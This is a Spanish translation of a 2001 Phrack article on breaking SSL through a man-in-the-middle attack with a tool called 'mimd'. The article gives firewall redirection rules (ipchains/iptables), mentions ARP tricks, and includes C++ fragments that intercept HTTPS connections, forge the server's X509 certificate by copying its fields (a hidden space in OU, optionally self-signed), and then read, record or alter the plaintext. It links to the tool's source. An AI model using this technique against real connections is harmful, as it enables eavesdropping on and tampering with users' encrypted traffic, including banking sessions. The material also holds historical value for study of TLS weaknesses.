@@ -1,0 +1,548 @@
+                             ==Phrack Inc.==
+
+             Volumen 0x0b, Numero 0x39, Archivo #0x0d de 0x12
+
+|=-=[ Aguaaanta snoopy, snoopy aguanta. (SSL para diversion y beneficio) ]=-=|
+|=--------------------------------------------------------------------------=|
+|=--------------------=[ Stealth <stealth@segfault.net> ]=------------------=|
+
+
+Introduccion
+------------
+
+SSL en la version 3 conocida como SSLv3 o la actual version 3.1 tambien
+conocida como TLS provee un mecanismo para transferir datos de forma
+segura sobre una red con reconocimiento de paquetes modificados o
+re-producidos. Tiene todos los requerimientos que un sistema necesita,
+digamos, manejando tus cuentas bancarias.
+
+Mostrare en practica que esto no es verdad.
+
+En este articulo te guiare a traves de las partes de SSL que son importantes
+para nosotros y necesarias de saber.
+Las cosas con las que no jugamos como el apreton de manos SSL no son
+explicadas en profundidad; echa un vistazo a las referencias si estas
+interesado.
+
+
+1. Por que SSL
+--------------
+
+SSL fue dise~ado para proveer:
+
+    1.) Confidencialidad
+
+    Esto es alcanzado encriptando los datos que son pasados sobre la red
+    con un algoritmo simetrico elegido durante el apreton de manos SSL.
+    SSL usa una cantidad de cifras variable, que se asume son irrompibles.
+    Si un nuevo ataque se muestra contra un algoritmo especifico, esto no
+    lastima mucho a SSL, solo elige uno diferente.
+
+
+    2.) Integridad de Mensaje
+
+    SSL esta usando un fuerte Message Authentication Code
+    (Codigo de Autenticacion de Mensaje) (MAC) tal como SHA-1 que esta
+    apendizado al final del paquete que contiene los datos y encriptados
+    junto con el payload.
+    De esa forma SSL detecta cuando el payload esta forzado, ya que los
+    hashes computados no coincidiran. El MAC es tambien usado para proteger
+    al apreton de manos de ser forzado.
+
+    2.1.) Proteccion contra ataques de repeticion
+
+    SSL esta usando numeros secuenciales para proteger las partes
+    de comunicacion de atacantes que estan grabando y repitiendo paquetes.
+    El numero secuencial esta encriptado tal como el payload lo esta.
+    Durante el apreton de manos es usado un 'random' para hacer al
+    apreton de manos unico e imposible el repetir ataques.
+
+    2.2.) Proteccion contra ataques de grabacion
+
+    Tal como en 2.1.) los numeros secuenciales tambien prohiben grabar
+    paquetes y enviarlos en un orden diferente.
+
+
+    3.) Autenticacion Endpoint (Punto Final)
+
+    Con X509 (actualmente version 3) los certificados SSL soportan
+    autenticacion de clientes y servidores. La autenticacion de servidores
+    es lo que quieres cuando se esta usando https con tu banco, pero aqui
+    es donde echaremos una mirada mas profunda.
+
+
+Esto suena a completamente seguro. Sin embargo usando el programa que esta
+explicado antes del final de este articulo, ninguno de los puntos es
+verdad (excepto que no podemos quebrar la autenticacion cliente).
+
+Al final podremos mirar los datos planos, modificandolos para nuestras
+necesidades, grabandolo, enviandolo demorado, en orden erroneo o duplicado.
+Esto podra ser basicamente hecho via un ataque man in the middle donde
+varias debilidades son explotadas en clientes SSL interactivos,
+"darselo al usuario" en particular.
+
+
+2. Certificados X509
+--------------------
+
+Los certificados X509 son parte integral de SSL. El servidor envia su
+cert al cliente durante el apreton de manos SSL.
+Un cert X509 original contiene el nombre distinguido (DN) del emisor,
+el DN del asunto, una version y un numero de serie, los algoritmos elegidos,
+un tiempo de frame donde la llave es valida y por supuesto la llave publica
+del asunto.
+
+El asunto es el nombre (distinguido) de la entidad a la que pertenece
+la llave publica en este cert. Desafortunadamente en certs X509 planos
+no hay campo que este etiquetado "DNS-name" para que tu puedas coincidirlo
+contra la URL que estes viendo en instancia. Generalmente el campo CN es
+lo que es mapeado al DNS name pero esto es solo una convencion de la cual
+ambos (cliente y la entidad ofreciendo su cert) deben estar alertados.
+"Emisor" es el nombre (distinguido) de la entidad que firmo este cert con
+su llave privada. Es llamado un Certificado de Autoridad -- CA.
+
+Veamos un cert X509:
+
+stealth@lydia:sslmim> ./cf segfault.net 443|openssl x509 -text
+Certificate:
+    Data:
+        Version: 1 (0x0)
+        Serial Number: 1 (0x1)
+        Signature Algorithm: md5WithRSAEncryption
+        Issuer: C=EU, ST=segfault, L=segfault,
+                O=www.segfault.net/Email=crew@segfault.net
+        Validity
+            Not Before: Nov 19 01:57:27 2000 GMT
+            Not After : Apr  5 01:57:27 2028 GMT
+        Subject: C=EU, ST=segfault, L=segfault, O=www.segfault.net,
+                 CN=www.segfault.net/Email=crew@segfault.net
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+            RSA Public Key: (1024 bit)
+                Modulus (1024 bit):
+                    00:cd:64:2a:97:26:7a:9b:5c:52:5e:9c:9e:b3:a2:
+                    e5:f5:0f:99:08:57:1b:68:3c:dd:22:36:c9:01:05:
+                    e1:e5:a4:40:5e:91:35:8e:da:8f:69:a5:62:cf:cd:
+                    70:dc:ca:d2:d7:92:03:5c:39:2a:6d:02:68:91:b9:
+                    0d:d1:2c:c7:88:cb:ad:be:cc:e2:fa:03:55:a1:25:
+                    47:15:35:8c:d9:78:ef:9f:6a:f6:5f:e6:9a:02:12:
+                    a3:c2:b8:6a:32:0f:1d:9d:7b:2f:65:90:4e:ca:f7:
+                    a0:e4:ae:55:91:09:e4:6e:01:e3:d1:71:1e:60:b1:
+                    83:88:8f:c4:6a:8c:bb:26:fd
+                Exponent: 65537 (0x10001)
+    Signature Algorithm: md5WithRSAEncryption
+        7d:c7:43:c3:71:02:c8:2f:8c:76:9c:f3:45:4c:cf:6d:21:5d:
+        e3:8f:af:8f:e0:2e:3a:c8:53:36:6b:cf:f6:27:01:f0:ed:ee:
+        42:78:20:3d:7f:e3:55:1f:8e:f2:a0:8e:1a:1b:e0:76:ad:3e:
+        a0:fc:5b:ce:a6:c4:32:7b:64:f2:a4:0f:a3:be:a1:0e:a7:ca:
+        ed:67:39:07:65:6b:cc:e7:5a:9a:b0:3a:f3:5c:1a:18:d4:dd:
+        8c:8d:5a:9e:a0:63:e0:7d:af:7c:97:7c:89:17:0f:25:2f:a7:
+        80:d3:02:dc:88:7a:12:64:ec:8a:ff:e4:62:92:2e:7f:75:03:
+        82:f1
+
+
+La linea importante es
+
+Issuer: C=EU, ST=segfault, L=segfault,
+        O=www.segfault.net/Email=crew@segfault.net
+
+Donde C, ST, L, O y Email (los tan nombrados DNs relativos -- RDN) construyen
+el DN del emisor.
+
+Lo mismo para el asunto:
+
+Subject: C=EU, ST=segfault, L=segfault, O=www.segfault.net,
+         CN=www.segfault.net/Email=crew@segfault.net
+
+Los certs quiza puedan ser firmados por un CA publico conocido donde el
+asunto no tiene control sobre la llave privada usada para ese proposito,
+o por el asunto en si mismo -- tan nombrado cert auto-firmado.
+
+En este ejemplo, el cert es firmado por un CA propio.
+
+BTW, este es el certificado original segfault.net, ninguno estuvo
+interceptando comunicacion mientras lo atraia.
+Veremos despues como se ve cuando alguno esta jugando con la conexion.
+Este certificado es intercambiado durante el apreton de manos SSL cuando
+apuntas el navegador netscape a https://segfault.net. La llave publica
+contenida en este cert es usada despues para encriptacion de sesion.
+
+Para tener un nivel bastante bueno de seguridad, los certs deberian ser
+firmados por un (tambien el tuyo, como en este ejemplo) o un CA publico.
+donde el cliente tiene el manejador de llave publica desde el CA para
+chequear la integridad del cert, y le pregunta al usuario para aceptarlo
+o denegarlo.
+Este "requerimiento" para clientes interactivos y la certeza de que
+hay tantos sitios "bien-surfeados" que proveen certs donde nadie tiene la
+llave para el chequeo apropiado por defecto hara a SSL obsoleto como
+ultima consecuencia para clientes SSL interactivos comunes, p.e. navegador
+Netscape.
+
+
+3. Metiendose en el medio
+-------------------------
+
+Como se vio, los certificados X509 son una parte importante de SSL. Su tarea
+es probarle al cliente que el esta hablando con el server que esta esperando,
+y que el esta usando la llave apropiada mientras lo esta haciendo.
+
+Ahora, imagina que podria hacerse cuando pudieramos falsificar un
+certificado, y forwardear una conexion SSL de forma transparente.
+
+Lo tienes? Su peor intento. Nuestro lema de cabecera 'teile und herrsche'
+muestra que hay dos problemas que deben ser resueltos.
+
+a) Hijackear la conexion para estar habilitado para forwardearlo
+   transparentemente.
+b) Falsificando certificados para el cliente, para que siempre vea los certs
+   que esta esperando y llevandonos al servidor real.
+
+
+a+b es generalmente llamado un ataque 'man in the middle'.
+Los certs X509 deberian hacer esto imposible pero las implementaciones
+chequeo comun de certs tal como el navegador Netscape (y en general,
+clientes interactivos) dificilmente lo tienen.
+
+El primer problema es muy facil de resolver. Dado que nos sentamos
+fisicamente entre las dos fiestas, solo usamos nuestras habilidades de
+firewall (preferentemente en Linux o BSD :) para redireccionar, digamos
+trafico https a nuestro programa llamado 'mind'. Esto probablemente
+podria verse asi
+
+# ipchains -A input -s 0/0 -d 0/0 443 -j REDIRECT 10000 -p tcp
+
+o similar para agarrar el trafico https en la cadena entrante.
+Para una accion local mimd en una box con kernel 2.4 tipeas
+
+# iptables -t nat -A OUTPUT -p tcp --sport 1000:3000 --dport 443\
+  -j REDIRECT --to-port 10000
+
+Dados los (esperados) puertos fuente desde el cliente SSL. Si lo omitimos,
+mimd entrara en un loop infinito (iptables puede redireccionar el trafico
+ya redireccionado). Ya que mimd bindea el puerto 8888 y arriba no sigue
+la regla.
+No necesitas sentarte fisicamente entre las fiestas,
+es suficiente generalmente para estar en la LAN del servidor o la LAN del
+cliente. ARP-tricks hace el trabajo bastante bien despues, las reglas del
+FW incluso no cambiaran.
+
+Con estas reglas de redireccion podemos ya configurar un bouncer simple
+con un loop select() minusculo. La direccion objetivo puede ser encontrada
+usando la API del sistema operativo (generalmente via getsockopt() o parecido
+Yo compile la funcion NS_Socket::dstaddr() para los SOs mas importantes :)
+Usando nuestro peque~o bouncer, no podemos ver lo que es pasado en el link,
+ya que no nos concierne SSL en si mismo.
+
+Para poder ver el trafico plano, deberiamos modificar nuestro peque~o
+bouncer (virtual) con un SSL_accpet() y una declaracion SSL_connect().
+Despues de accept() la conexion podemos hacer connect() al objetivo real
+y realizar una llamada a SSL_connect(). Hecho esto, invocamos SSL_accept().
+Asumiendo que hemos hecho las cosas de inicializacion antes de tal como
+cargar el archivo de llave etc. el cliente SSL ahora le mostrara el cert
+del bouncer al usuario.
+Obviamente para el esto esta falsificado, porque cuando el surfea una
+compa~ia-A y obtiene un cert para compa~ia-B o 'MiM' esta probablemente
+un poco confundido.
+Resolveremos ese problema. Nuestras llamadas a SSL_connect() y SSL_accept()
+estan ya en el orden correcto, y ahora explicare por que.
+
+
+4. DCA
+------
+
+Podemos ya ver el texto plano de la conexion via SSL_read() y forwardearlo
+al objetivo via SSL_write() si el usuario en el cliente SSL tan solo acepta
+el certificado.
+Ahora es tiempo de resolver la segunda parte del problema: falsificando
+el certificado.
+
+Recuerda, primero realizamos SSL_connect(), antes hacemos el SSL_accept(),
+entonces el servidor nos ve como un cliente legitimo cuando se esta
+haciendo SSL_connect() y hace el apreton de manos SSL.
+Como resultado tenemos el certificado del server.
+
+Veamos que tenemos hasta ahora:
+
+...
+
+// bloqueo para conexiones internas
+while ((afd = accept(sfd, (sockaddr*)&from, &socksize)) >= 0) {
+
+        // Obtener el destino real
+        // de conexion
+        if (NS_Socket::dstaddr(afd, &dst) < 0) {
+        	log(NS_Socket::why());
+                die(NULL);
+        }
+
+	...
+
+	++i;
+	if (fork() == 0) {
+				
+                // --- lado del cliente
+		if ((sfd2 = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
+			log("main::socket");
+			die(NULL);
+		}
+
+			
+		if (NS_Socket::bind_local(sfd2, 8888+i, 0) < 0) {
+			log(NS_Socket::why());
+			die(NULL);
+		}
+			
+	
+                // lanzar conexion al servidor real
+		if (connect(sfd2, (struct sockaddr*)&dst, 
+		    sizeof(dst)) < 0) {
+			log("main::connect");
+			die(NULL);
+		}
+
+		...
+			
+		client->start();
+                client->fileno(sfd2);   // este socket para usar
+			
+                // haz el apreton de manos SSL
+		if (client->connect() < 0) {
+			log("Clientside handshake failed. Aborting.");
+			die(NULL);
+		}
+
+El apreton de manos con el servidor real es terminado justo *ahora*.
+Toma esto como algun tipo de pseudocodigo SSL, el uso de SSL_connect()
+y SSL_accept() esta encapsulado dentro de los objetos cliente y servidor
+respectivamente.
+Ahora nos podemos preparar para ser un servidor para el cliente SSL: 
+	
+
+                // --- lado del servidor
+
+                server->start();        // crear objeto SSL
+                server->fileno(afd);    // configurar socket a usar
+
+Sin llamar a SSL_accept() hasta que realmente hagamos la falsificacion:
+			
+		if (enable_dca)
+			NS_DCA::do_dca(client, server);
+
+Dynamic Certificate Assembly (DCA) hace lo siguiente:
+
+Dado un certificado casi vacio (todos los RDN son no-existentes excepto C --
+Country) el do_dca() llena este cert X509 con los contenidos del certificado
+X509 obtenido durante el apreton de manos SSL con el servidor antes. Ripeamos
+el L, ST, O, CN, el OU y el campo Email (como presentado) y lo ubicamos dentro
+de nuestro certificado que mostraremos al cliente SSL. Esto es hecho usando
+algun parseador de string feo, y usando funciones X509_() ofrecidas por
+OpenSSL.
+Para el campo OU en el realizador apendizamos un espacio " " que no
+mostraremos en la ventana del cliente SSL pero lo hace diferir de los
+certs guardados de los CAs publicos. Al usuario le saldra un prompt para
+aceptar un cert de un "CA bien conocido" (porque el usuario ve el nombre,
+pero no el espacio apendizado, el cliente SSL no puede encontrar una
+llave publica apropiada para este CA y promptea), el que probablemente
+aceptara.
+
+Lindo eh? Como un regalo especial, podemos usar los campos de asunto
+(CN,...) para los campos realizadores entonces el CA formador publico
+firmado con el cert X509 se convierte en auto-firmado! Ya que los
+certificados auto-firmados son generalmente mostrados al usuario pero
+el no puede saber que esto es falso!
+Asembleado el cert, mostremoselo al cliente:
+
+
+        // haz el apreton de manos SSL como servidor falso
+        if (server->accept() < 0) {
+	        log("Serverside handshake failed. Aborting.");
+	        die(NULL);
+        }
+
+        ssl_forward(client, server);
+
+
+Hecho. ssl_forward() llama a SSL_read/SSL_write en un loop y graba los
+datos planos. Podemos tambien modificar el stream, reproduciendolo o
+sorprendiendolo -- como deseemos.
+
+Busquemos un cert X509 de un servidor https via cf cuando mimd esta activo:
+
+[comenzando mimd en algun lugar, quiza en localhost]
+
+stealth@lydia:sslmim> ./cf segfault.net 443|openssl x509 -text
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number: 1 (0x1)
+        Signature Algorithm: md5WithRSAEncryption
+        Issuer: C=US, C=EU, ST=segfault, L=segfault,
+                O=www.segfault.net, OU= /Email=crew@segfault.net
+        Validity
+            Not Before: Mar 20 13:42:12 2001 GMT
+            Not After : Mar 20 13:42:12 2002 GMT
+        Subject: C=US, C=EU, ST=segfault, L=segfault, O=www.segfault.net,
+                 CN=www.segfault.net/Email=crew@segfault.net
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+            RSA Public Key: (1024 bit)
+                Modulus (1024 bit):
+                    00:d4:4f:57:29:2c:a0:5d:2d:af:ea:09:d6:75:a3:
+                    e5:b6:db:41:d7:7f:b7:da:52:af:d1:a7:b8:bb:51:
+                    94:75:8d:d4:c4:88:3f:bf:94:b1:a9:9a:f8:55:aa:
+                    0d:11:d6:8f:8c:8b:5b:b5:db:03:18:7e:7a:d7:3b:
+                    b0:24:a9:d6:ba:9a:a7:bb:9b:ba:78:50:65:4b:21:
+                    94:6f:83:d4:de:16:e4:8b:03:f2:97:f0:0b:9b:55:
+                    ed:aa:d2:c3:ee:66:55:10:ba:59:4d:f0:9d:4e:d4:
+                    b5:52:ff:8c:d9:75:c2:ae:49:be:63:57:b9:48:36:
+                    ca:c2:07:9d:ba:32:ff:d6:e7
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Subject Key Identifier:
+                4A:2C:50:3A:50:4E:96:3D:E6:C7:4E:E8:C2:DF:41:F0:0A:26:F0:DD
+            X509v3 Authority Key Identifier:
+                keyid:4A:2C:50:3A:50:4E:96:3D:E6:C7:4E:E8:C2:DF:41:F0:0A:26:F0:DD
+                DirName:/C=US
+                serial:00
+
+            X509v3 Basic Constraints:
+                CA:TRUE
+    Signature Algorithm: md5WithRSAEncryption
+        b7:7d:5a:c7:73:19:66:aa:89:25:7c:f6:bc:fd:7d:82:1a:d0:
+        ac:76:93:72:db:2d:f6:3b:e0:88:5f:1d:6e:7c:25:d7:a2:de:
+        86:28:38:90:cf:fe:38:a0:1f:67:87:37:8b:2c:f8:65:57:de:
+        d1:4c:67:55:af:ca:4c:ae:7b:13:f2:6f:b6:64:f6:aa:7f:28:
+        8b:2f:21:07:8f:6d:7e:0c:3f:17:b1:69:3a:ea:c0:fb:a2:aa:
+        f9:d6:a6:05:6d:77:e1:e6:f0:12:a3:e6:ca:2a:73:33:f2:91:
+        e1:72:c8:83:84:48:fa:fe:98:6c:d4:5a:ab:98:b2:2e:3c:8a:
+        eb:f2
+
+
+Como puedes ver, la llave publica difiere de la anterior (sin mimd)
+porque es la misma llave mimd. El campo C contiene "US" y "EU" donde solo
+el mas tardio es mostrado en Netscape, entonces no hay diferencia.
+Alertados del " " en el campo OU? Ya que el cert original no contenia un
+campo OU, ahora es tan solo un " ". No importa.
+El realizador ha sido tomado del campo realizador original en el cert X509.
+Ahora, tratemos de tomar el campo de asunto para el realizador. Algo
+obsoleto para este ejemplo porque no esta firmado por un CA publico, pero
+en caso un CA publico importante firmo el cert, un auto-firmado falso
+podria ser un lindo juguete:
+
+[reiniciando mimd, esta vez en la forma 'usa-asunto']
+
+stealth@lydia:sslmim> ./cf segfault.net 443|openssl x509 -text
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number: 1 (0x1)
+        Signature Algorithm: md5WithRSAEncryption
+        Issuer: C=US, C=EU, ST=segfault, L=segfault,
+                O=www.segfault.net, OU= , CN=www.segfault.net/Email=crew@segfault.net
+        Validity
+            Not Before: Mar 20 13:42:12 2001 GMT
+            Not After : Mar 20 13:42:12 2002 GMT
+        Subject: C=US, C=EU, ST=segfault, L=segfault, O=www.segfault.net,
+                 CN=www.segfault.net/Email=crew@segfault.net
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+            RSA Public Key: (1024 bit)
+                Modulus (1024 bit):
+                    00:d4:4f:57:29:2c:a0:5d:2d:af:ea:09:d6:75:a3:
+                    e5:b6:db:41:d7:7f:b7:da:52:af:d1:a7:b8:bb:51:
+                    94:75:8d:d4:c4:88:3f:bf:94:b1:a9:9a:f8:55:aa:
+                    0d:11:d6:8f:8c:8b:5b:b5:db:03:18:7e:7a:d7:3b:
+                    b0:24:a9:d6:ba:9a:a7:bb:9b:ba:78:50:65:4b:21:
+                    94:6f:83:d4:de:16:e4:8b:03:f2:97:f0:0b:9b:55:
+                    ed:aa:d2:c3:ee:66:55:10:ba:59:4d:f0:9d:4e:d4:
+                    b5:52:ff:8c:d9:75:c2:ae:49:be:63:57:b9:48:36:
+                    ca:c2:07:9d:ba:32:ff:d6:e7
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Subject Key Identifier:
+                4A:2C:50:3A:50:4E:96:3D:E6:C7:4E:E8:C2:DF:41:F0:0A:26:F0:DD
+            X509v3 Authority Key Identifier:
+                keyid:4A:2C:50:3A:50:4E:96:3D:E6:C7:4E:E8:C2:DF:41:F0:0A:26:F0:DD
+                DirName:/C=US
+                serial:00
+
+            X509v3 Basic Constraints:
+                CA:TRUE
+    Signature Algorithm: md5WithRSAEncryption
+        b7:7d:5a:c7:73:19:66:aa:89:25:7c:f6:bc:fd:7d:82:1a:d0:
+        ac:76:93:72:db:2d:f6:3b:e0:88:5f:1d:6e:7c:25:d7:a2:de:
+        86:28:38:90:cf:fe:38:a0:1f:67:87:37:8b:2c:f8:65:57:de:
+        d1:4c:67:55:af:ca:4c:ae:7b:13:f2:6f:b6:64:f6:aa:7f:28:
+        8b:2f:21:07:8f:6d:7e:0c:3f:17:b1:69:3a:ea:c0:fb:a2:aa:
+        f9:d6:a6:05:6d:77:e1:e6:f0:12:a3:e6:ca:2a:73:33:f2:91:
+        e1:72:c8:83:84:48:fa:fe:98:6c:d4:5a:ab:98:b2:2e:3c:8a:
+        eb:f2
+
+
+La unica diferencia entre estos dos es que un CN se muestra en
+el campo realizador ahora que no ha estado ahi antes.
+Podria tener mas efecto con CAs publicos como ya mencione.
+
+
+5. Conclusion
+-------------
+
+Para concluir: un usuario surfeando la web con un cliente interactivo
+de los que existen por ahora NO PUEDE SABER que su conexion esta sujeta
+a un ataque mim. No hay forma para el de distinguir entre 'mensajes del
+browser porque la compa~ia usa un CA desconocido' o 'el CA desconocido es
+mimd'. Incluso cuando ya surfeo el sitio y guardo el cert (!) puede caer
+en esta trampa. Un usuario atento PODRIA notar que esta siendo preguntado
+para aceptar un 'RSA Data Security' o un certificado firmado 'Verisign'
+y duda. Activando el switch auto-firmado en mimd matara sus dudas.
+
+En este articulo me focalice en el camino 'puertos separados' para
+quebrar SSL, hay tambien una cosa llamada 'negociacion ascendente'
+que convierte un stream formador texto plano en un stream SSL via una
+palabra clave (STARTTLS por ejemplo). Todas las cosas dichas acerca
+de SSL se aplican a el, solo que no puedes usar mimd en este caso,
+porque necesitas filtrar conexiones SSL y forwardearlo a mimd.
+Esto probablemente sea hecho usando MSG_PEEK; estamos investigando. :)
+
+
+
+Gracias a
+
+Segfault Consortium por proveer un entorno de prueba y
+varias cosas para hacer lectura de prueba al articulo.
+Quejate a ellos si algo esta mal. :)
+
+
+Referencias:
+------------
+
+[1] "SSL and TLS" Designing and Building Secure Systems
+    Eric Rescorla, AW 2001
+
+    Un 'debes-leerlo' si quieres/necesitas saber como funciona SSL.
+
+[2] "Angewandte Kryptographie"
+    Bruce Schneier, AW 1996
+
+    THE book for crypto-geeks. Yo lei la version alemana,
+    en ingles es 'Applied Cryptographie'
+
+[2] varios archivos-c openssl y paginas man
+
+[3] http://www.cs.uni-potsdam.de/homepages/students/linuxer/sslmim.tar.gz
+    Una implementacion DCA, descripta en este articulo;
+    tambien contiene la herramienta 'cf'.
+
+[4] En caso de que no puedas probar mimd en tu box local, ve
+    una snapshot de una session mim-eada provista por TESO:
+    http://www.team-teso.net/ssl-security.png
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
+
+
+
